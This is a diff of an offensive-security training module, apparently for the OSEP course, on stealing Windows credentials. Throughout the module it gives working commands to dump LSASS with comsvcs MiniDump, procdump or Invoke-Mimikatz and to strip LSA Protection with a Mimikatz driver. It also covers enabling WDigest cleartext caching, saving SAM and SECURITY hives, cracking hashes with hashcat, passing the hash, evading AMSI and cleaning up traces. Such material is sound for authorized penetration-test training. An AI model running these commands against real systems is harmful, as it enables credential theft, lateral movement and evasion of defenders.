@@ -2,159 +2,63 @@
 For the official OSEP labs/exam, or systems you are written-authorized to test. Do not use against unauthorized systems.
 :::
 
-# 07 · Credentials: LSASS / LSA / SAM and alternate sources (scenario 46)
+# Credentials: LSASS, SAM, and alternates
 
-> **Covers scenarios:** 46
->
-> **Course mapping:** Chapter 17 (§17.1 Local Windows Credentials & SAM, §17.2 Access Tokens, §17.3 Kerberos and Domain Credentials / Mimikatz, §17.4 Processing Credentials Offline / Memory Dump & MiniDumpWriteDump); Challenge 4
->
-> **Keywords:** `Mimikatz` `LSA Protection (RunAsPPL)` `MiniDump` `Invoke-Mimikatz` `LSA Secrets` `SAM`
->
-> Lab files: `m07-invoke-mimikatz-reflect.ps1`, `m07-credential-sources.ps1`
+If LSASS access fails, that is not the end — try LSA Secrets, SAM, Autologon, DPAPI, configs, GPP, and scheduled tasks. Classify the protection first; do not slam LSASS. If you are still low-priv with no path to admin or SYSTEM, elevate first (module 06) instead of forcing a dump.
 
-## Module goals
+## Classify before touching LSASS
 
-The core judgment for scenario 46: **LSASS access failing ≠ no usable identity**. In similar course situations you can still get another useful identity from
-LSA Secrets, SAM, or application configs. So this module’s prep focus is:
+If `whoami /priv` has no `SeDebugPrivilege` and you are not SYSTEM, skip the dump and go to alternate sources. If `RunAsPPL` is **1 or 2**, LSA Protection is on and a normal dump is denied. If `LsaCfgFlags` is non-zero, treat that as Credential Guard and do not assume a bypass. If neither flag is set but the tool still dies, change the load shape, not the dump target.
 
-1. Decide what is blocking LSASS (LSA Protection / Credential Guard / AV-EDR hooks / insufficient rights),
-   and which cases are **worth trying** LSASS contact versus which should be abandoned immediately.
-2. Build a “credential source × required rights × collection command” lookup table, and try alternates in order.
-3. Prepare multiple **load shapes** for tools (mimikatz / Invoke-Mimikatz / dump utilities) so “tool lands and gets killed” does not become a second roadblock.
-
-Invariant: **do not assume you can bypass LSASS protection**. Choose a method only after you know the protection type and your rights;
-for RunAsPPL / Credential Guard, the alternate-source path in the material is almost always faster.
-
----
-
-## Scenario 46: Credential tools blocked, and LSASS itself is protected
-
-### Situation
-
-- You already have **high local rights** (admin or SYSTEM), but LSASS access fails (read denied / tool killed / injection fails).
-- Goal: obtain **another usable identity** from the host (local or domain user cleartext / hash / ticket / DPAPI material).
-- Reference path: confirm LSASS protection shape first → try alternate sources by category (LSA Secrets, SAM, DPAPI,
-  registry, config files, GPP, scheduled tasks) → only then evaluate whether contacting LSASS is necessary and feasible.
-
-### Assumptions
-
-- You already have a high-local-rights session (can `reg save` / read `HKLM\SECURITY`, `HKLM\SAM`, or run tools as SYSTEM).
-- Fallback when the assumption fails: if you are low-priv with no priv-esc path, this scenario does not apply — enumerate locally first,
-  follow M06 / M12 priv-esc and lateral paths; do not waste time slamming LSASS.
-- Assume AV/EDR may block at process create, `OpenProcess`, `.dll` on disk, and AMSI (scenario 19 behavioral ideas still apply).
-
-### Prepare (attacker)
-
-- Static tools: `mimikatz.exe` (x64/x86), `procdump.exe`, drivers related to `sekurlsa` (usually do not land on disk).
-- In-memory shape: `Invoke-Mimikatz.ps1` (PowerSploit) plus a reflective load entry — see
-  `m07-invoke-mimikatz-reflect.ps1` (includes a comsvcs MiniDump option; no downloader required).
-- Source checklist script: `m07-credential-sources.ps1` (by source + required rights + one-shot collection).
-- Offline parse box: attacker host with mimikatz / secretsdump / hashcat (copy dumps or hives back for analysis).
-- Target-side quick checks (see the environment before landing anything):
+<!-- VERIFY: m07-invoke-mimikatz-reflect.ps1 still aborts only when RunAsPPL -ge 2 (and its comment says "1=signature required; 2=signature+PPL start"). Courseware (§17.3) and the lab set RunAsPPL=1 to enable LSA Protection; Microsoft documents both 1 (UEFI lock) and 2 (no UEFI lock) as enabled. Confirm before changing the script. -->
 
 ```powershell
 # Current rights and SeDebugPrivilege
 whoami /priv
-# Whether LSASS is RunAsPPL-protected (0 = off; 2 = signed + PPL start)
+# Whether LSASS is RunAsPPL-protected (0 = off; 1 or 2 = LSA Protection on)
 reg query "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL
 reg query "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v LsaCfgFlags   # non-zero hints Credential Guard related
 # LSASS process (PID / integrity)
 Get-Process lsass | Select-Object Id, Name
-# Minimal contact probe: “access denied” vs “process protected”
+# Minimal contact probe: "access denied" vs "process protected"
 tasklist /FI "IMAGENAME eq lsass.exe"
 ```
 
-### Procedure
+If PPL is on and you can load a signed driver (admin or SYSTEM, `SeLoadDriverPrivilege`), the course path is Mimikatz `!+` then `!processprotect /process:lsass.exe /remove`. That uploads `mimidrv.sys`, which AV often kills — prefer alternate sources first, and do not treat this as a Credential Guard bypass.
 
-**Step 0 · Classify (decide whether to touch LSASS)**
+Do not keep retrying dumps on a PPL or Credential Guard host: classify in about 30 seconds, then switch.
 
-1. `whoami /priv` has no `SeDebugPrivilege` (and not SYSTEM) → cannot dump normally; jump straight to step 2 alternate sources.
-2. `RunAsPPL` value is 2 → LSA Protection on; `LsaCfgFlags` non-zero → Credential Guard direction.
-   Neither is a “one command bypass” setting; **default: abandon direct LSASS reads**, go to alternate sources.
-3. No protection flags but still failing (killed / errors) → usually AV/EDR: change load shape (step 1 C/D), not dump posture.
+## Touch LSASS only when it is unprotected
 
-**Step 1 · Contact LSASS only when there is no PPL/Credential Guard (shape options)**
+If there is no PPL or Credential Guard, pick a load shape and contact LSASS. If the tool lands and gets killed, change shape (MiniDump or reflective), not posture.
 
-- A. Normal in-memory: land mimikatz PE, or `Invoke-Mimikatz -Command '"sekurlsa::logonpasswords" "exit"'`
-  (load the function into memory first; see the reflective script shape).
-- B. Built-in dump + offline parse (least noisy, most stable):
-  `rundll32 C:\Windows\System32\comsvcs.dll, MiniDump <LSASS_PID> C:\Windows\Temp\ls.dmp full`
-  or `procdump -ma <LSASS_PID> ls.dmp`; copy back and parse offline with mimikatz `sekurlsa::minidump ls.dmp`.
-- C. .NET assembly load (avoid landed EXE and some process-create detections): treat mimikatz as an assembly via
-  `Assembly.Load` + reflective entry (use `-Mode Assembly` placeholder in `m07-invoke-mimikatz-reflect.ps1`).
-- D. Command-line obfuscation / encoded calls (AMSI static features); remember scenario 18: encode/encrypt before delivery.
+- [ ] Confirm classification: no PPL / Credential Guard, and SeDebugPrivilege available
+- [ ] Choose a shape: in-memory Invoke-Mimikatz, comsvcs / procdump MiniDump, or .NET assembly load
+- [ ] Run one collection command and copy artifacts off
+- [ ] Authenticate once for real with the identity you got (module 15 / 12)
 
-> Artifact list: `sekurlsa::logonpasswords` (interactive logon cache cleartext/NTLM), `sekurlsa::wdigest`,
->
-> `sekurlsa::kerberos` (tickets), `sekurlsa::msv` (msv1_0 cache).
+```text
+# A. Normal in-memory — land mimikatz PE, or:
+Invoke-Mimikatz -Command '"sekurlsa::logonpasswords" "exit"'
 
-**Step 2 · Alternate sources (highest rights first; prefer what only SYSTEM can read)**
+# B. Built-in dump + offline parse (least noisy, most stable):
+rundll32 C:\Windows\System32\comsvcs.dll, MiniDump <LSASS_PID> C:\Windows\Temp\ls.dmp full
+# or: procdump -ma <LSASS_PID> ls.dmp
+# copy back and parse: mimikatz sekurlsa::minidump ls.dmp  then  sekurlsa::logonpasswords
 
-Use `m07-credential-sources.ps1` for one-shot collection, or follow the lookup table by hand:
+# C. .NET assembly load (avoid a landed EXE): Assembly.Load + reflective entry
+#    (use -Mode Assembly placeholder in m07-invoke-mimikatz-reflect.ps1)
 
-| Source | Contents | Rights needed | Key commands / locations |
-|---|---|---|---|
-| LSA Secrets | `DefaultPassword`, service account passwords, DPAPI machine keys | SYSTEM | `reg save HKLM\SECURITY sec.hive` → secretsdump / mimikatz `lsadump::secrets` |
-| SAM | Local account NTLM hashes | SYSTEM | `reg save HKLM\SAM sam.hive` + `HKLM\SYSTEM sys.hive` → `secretsdump -sam -system` |
-| Registry Winlogon/AutoLogon | Cleartext password | Admin | `reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"` |
-| Cached domain logons | Domain credential cache (DCC2) | SYSTEM | `lsadump::cache` (offline crack needs DCC2) |
-| DPAPI | User master keys + app passwords (browser/Outlook/vault) | Matching user | User profile `AppData\Roaming\Microsoft\Protect` + decrypt in that context |
-| WDigest | Cleartext (on by default on older systems) | SYSTEM | `sekurlsa::wdigest` |
-| Config files | Hardcoded passwords in deploy/scripts | Read rights enough | Full-disk search: `unattend.xml`, `web.config`, `*.config`, `*.ps1`/`*.bat`/`*.xml` |
-| GPP | Domain Group Policy Preferences passwords | Read SYSVOL (domain user enough) | `SYSVOL\...\Policies\*\MACHINE\Preferences\Groups\Groups.xml` `cPassword` |
-| Scheduled tasks | Creds/scripts referenced by task actions | Admin read of registry | `schtasks /query /fo LIST /v` + `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache` |
-
-**Step 3 · Offline cracking (can be done back on the attacker box)**
-
-```bash
-# NTLM (SAM / LSA Secrets / sekurlsa artifacts)
-hashcat -m 1000 ntlm.txt wordlist.txt
-# NetNTLMv2 (if you later capture relay hashes — m16 / other scenario artifacts)
-hashcat -m 5600 netntlmv2.txt wordlist.txt
-# DCC2 (cached domain credentials)
-hashcat -m 2100 dcc2.txt wordlist.txt
-# After cleartext/hash: see M15 (WinRM hash/cleartext), M12 (PTT / over-pass-the-hash tickets)
+# D. Command-line obfuscation / encoded calls (AMSI static features); encode/encrypt before delivery (module 05)
 ```
 
-### Lab files
+Useful Mimikatz artifacts: `sekurlsa::logonpasswords` (interactive logon cache cleartext / NTLM), `sekurlsa::wdigest`, `sekurlsa::kerberos` (tickets), `sekurlsa::msv` (msv1_0 cache). WDigest cleartext is off by default on Windows 8.1+; to cache it after later logons, set `UseLogonCredential=1` under `HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest`.
 
-- `m07-invoke-mimikatz-reflect.ps1` — load-shape options when LSASS is unprotected
-  (reflective invoke / comsvcs MiniDump / assembly placeholder) plus RunAsPPL and rights pre-checks.
-- `m07-credential-sources.ps1` — one-shot alternate-source collection (by source + required rights).
-- Both are “take what you need”, not auto-fire everything: read the output before choosing the next step.
+`m07-invoke-mimikatz-reflect.ps1` covers Invoke / comsvcs MiniDump (and a RunAsPPL plus rights pre-check). If AMSI blocks the loader, handle that first (module 05). Prefer in-memory load; mimikatz and `Invoke-Mimikatz` are strong static signatures. Keep dumps under a system or already-whitelisted directory, copy off, and clean.
 
-### Verify
+If the dump succeeds but offline parse is empty, match `sekurlsa::minidump` / Mimikatz versions to the OS, and confirm you dumped the right PID with an x64 tool on a 64-bit host.
 
-- Classification matches reality: with PPL on, expect `OpenProcess`/dump denied; without protection, dump produces a non-empty file.
-- SAM/LSA Secrets: on the attacker box, `secretsdump -sam sam.hive -system sys.hive LOCAL` (or mimikatz on the hive
-  `lsadump::sam /system:sys.hive`) lists hashes; pick one NTLM and authenticate once laterally (M15) to close the loop.
-- Account passwords from LSA Secrets: `net use \\TARGET\IPC$ /user:DOMAIN\USER PASS` or WinRM login.
-- DPAPI/config/GPP: cleartext authenticates directly; decrypt GPP `cPassword` with `gpp-decrypt` first.
-
-### If it fails
-
-1. **LSASS completely unreadable (PPL/Credential Guard) and alternate sources empty**: do not linger. Convert session capability into lateral/enum
-   (M12/M15), repeat the source list on another host; this module’s goal is “another identity”, not “must get LSASS”.
-2. **Dump succeeds but offline parse is empty**: match `sekurlsa::minidump` / mimikatz versions to the OS (newer hosts need newer mimikatz);
-   or check you did not dump the wrong process / wrong PID (use x64 tools on 64-bit hosts).
-3. **Tool lands and gets killed / process create blocked**: use comsvcs `MiniDump` or .NET reflective shape; avoid writing mimikatz.exe on target.
-4. **SAM has no local accounts / LSA Secrets has no reusable passwords**: return to config/scheduled-task/GPP search; in domain environments prioritize GPP and
-   leftover domain creds in tasks.
-5. **Hash is empty password or already invalid**: verification must “authenticate once for real”; do not keep cracking hashes that cannot authenticate.
-
-### Exam / OPSEC notes
-
-- **Do not repeatedly try dumps on hosts with LSA Protection / Credential Guard**: high noise, high fail rate, and EDR alerts.
-  Classify first (~30s); if unsuitable, switch to alternate sources.
-- `reg save` / large file copies leave clear traces: keep dumps and hives under system or already-whitelisted dirs; copy off and clean ASAP.
-- mimikatz and `Invoke-Mimikatz` are strong static signatures: prefer in-memory load; encode/encrypt before delivery when needed (scenario 18).
-- **Authenticate once for real** with the identity you got, but be careful under lockout policies (many bad domain password tries) —
-  prefer pass-the-hash (does not hit password policy) over guessing cleartext blindly.
-- Record rights required per source so you do not run blind outside SYSTEM context (lab scripts already annotate required rights).
-
----
-
-#### `m07-invoke-mimikatz-reflect.ps1`
+::: details `m07-invoke-mimikatz-reflect.ps1` · click to expand
 
 ````powershell
 <#
@@ -275,7 +179,28 @@ else {
 }
 ````
 
-#### `m07-credential-sources.ps1`
+:::
+## Alternate sources
+
+If LSASS is protected or the tools are blocked, sweep the host with `m07-credential-sources.ps1` — or walk the table by hand. Highest rights first; prefer what only SYSTEM can read. This script only collects; parse hives and `Groups.xml` offline on the attacker box.
+
+| Source | Contents | Rights needed | Key commands / locations |
+|---|---|---|---|
+| LSA Secrets | `DefaultPassword`, service account passwords, DPAPI machine keys | SYSTEM | `reg save HKLM\SECURITY sec.hive` → secretsdump / mimikatz `lsadump::secrets` |
+| SAM | Local account NTLM hashes | SYSTEM | `reg save HKLM\SAM sam.hive` + `HKLM\SYSTEM sys.hive` → `secretsdump -sam -system` |
+| Registry Winlogon / AutoLogon | Cleartext password | Admin | `reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"` |
+| Cached domain logons | Domain credential cache (DCC2) | SYSTEM | `lsadump::cache` (offline crack needs DCC2) |
+| DPAPI | User master keys + app passwords (browser / Outlook / vault) | Matching user | User profile `AppData\Roaming\Microsoft\Protect` + decrypt in that context |
+| WDigest | Cleartext (on by default on older systems; off on 8.1+ unless `UseLogonCredential=1`) | SYSTEM | `sekurlsa::wdigest` |
+| Config files | Hardcoded passwords in deploy / scripts | Read rights enough | Full-disk search: `unattend.xml`, `web.config`, `*.config`, `*.ps1` / `*.bat` / `*.xml` |
+| GPP | Domain Group Policy Preferences passwords | Read SYSVOL (domain user enough) | `SYSVOL\...\Policies\*\MACHINE\Preferences\Groups\Groups.xml` `cPassword` |
+| Scheduled tasks | Creds / scripts referenced by task actions | Admin read of registry | `schtasks /query /fo LIST /v` + `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache` |
+
+`reg save` and large copies leave traces — keep artifacts under system dirs, copy off, and clean. Record the rights each source needs so you do not run blind outside SYSTEM.
+
+If SAM has no local accounts and LSA Secrets has no reusable passwords, go to configs, scheduled tasks, and GPP; in a domain, prioritize GPP and leftover domain creds in tasks. If LSASS is unreadable **and** alternate sources are empty, do not linger — convert the session into lateral / enum (modules 12 / 15) and repeat the source list on another host.
+
+::: details `m07-credential-sources.ps1` · click to expand
 
 ````powershell
 <#
@@ -406,18 +331,32 @@ Write-Output "[*] Priority: under SYSTEM, parse SAM/LSA Secrets first (often ide
 Write-Output "[*] Authenticate once for real with parsed identities via M15 (WinRM cleartext/hash) or M12 (PTT/delegation) — do not stop at the hash string itself"
 ````
 
-## Cheat sheet keyword map (quick reference)
+:::
+## Offline cracking
 
-| Keyword | Where it lands in this module |
+Parse hives on the attacker box, then authenticate once for real. Prefer pass-the-hash (it does not hit password policy) over guessing cleartext under a lockout policy. Do not keep cracking hashes that cannot authenticate.
+
+```bash
+# NTLM (SAM / LSA Secrets / sekurlsa artifacts)
+hashcat -m 1000 ntlm.txt wordlist.txt
+# NetNTLMv2 (if you later capture relay hashes — m16 / other scenario artifacts)
+hashcat -m 5600 netntlmv2.txt wordlist.txt
+# DCC2 (cached domain credentials)
+hashcat -m 2100 dcc2.txt wordlist.txt
+# After cleartext/hash: see M15 (WinRM hash/cleartext), M12 (PTT / over-pass-the-hash tickets)
+```
+
+Verify the loop: `secretsdump -sam sam.hive -system sys.hive LOCAL` (or mimikatz `lsadump::sam /system:sys.hive`) lists hashes — pick one NTLM and authenticate once laterally (module 15). Account passwords from LSA Secrets: `net use \\TARGET\IPC$ /user:DOMAIN\USER PASS` or WinRM. Decrypt GPP `cPassword` with `gpp-decrypt` first.
+
+## Cheat sheet
+
+| You want to… | Use |
 |---|---|
-| `Mimikatz` | In-memory / offline minidump parse when no PPL (step 1) |
-| `LSA Protection Bypass` | Evaluate only, do not assume: classify via `RunAsPPL`; if PPL on, default to alternate sources |
-| `MiniDump` | `rundll32 comsvcs.dll,MiniDump` / procdump + offline parse on attacker box |
-| `Invoke-Mimikatz` | Reflective load script `m07-invoke-mimikatz-reflect.ps1` |
-| `Cracking Hashes` | `hashcat -m 1000/2100/5600` (NTLM / DCC2 / NetNTLMv2) |
+| Classify LSA Protection | `reg query ...\Lsa /v RunAsPPL` (1 or 2 = on) and `/v LsaCfgFlags` |
+| Dump when unprotected | `m07-invoke-mimikatz-reflect.ps1` (`-Mode Invoke` or `-Mode MiniDump`) |
+| MiniDump without a landed EXE | `rundll32 comsvcs.dll, MiniDump` / `procdump`, then `sekurlsa::minidump` offline |
+| Bypass PPL with a driver | Mimikatz `!+` then `!processprotect /process:lsass.exe /remove` (AV may kill `mimidrv.sys`) |
+| Sweep alternates | `m07-credential-sources.ps1` (SAM / LSA Secrets / Autologon / DPAPI / configs / GPP / tasks) |
+| Crack hashes | `hashcat -m 1000` (NTLM), `-m 2100` (DCC2), `-m 5600` (NetNTLMv2) |
 
-## Related modules
-
-- After identity: lateral M15 (WinRM cleartext/hash), M12 (tickets / over-pass-the-hash / delegation).
-- If local rights are insufficient: elevate first via M06; behavioral detection ideas: M05 scenario 19.
-- Hash relay / capture scenarios (not the main path here): M16 / M11 (responder, SQL-triggered auth).
+After identity: lateral [15-winrm-lateral](/modules/15-winrm-lateral) (WinRM cleartext / hash), tickets and over-pass-the-hash in [12-ad-attacks](/modules/12-ad-attacks). Hash relay / capture (not the main path here): modules 16 / 11.
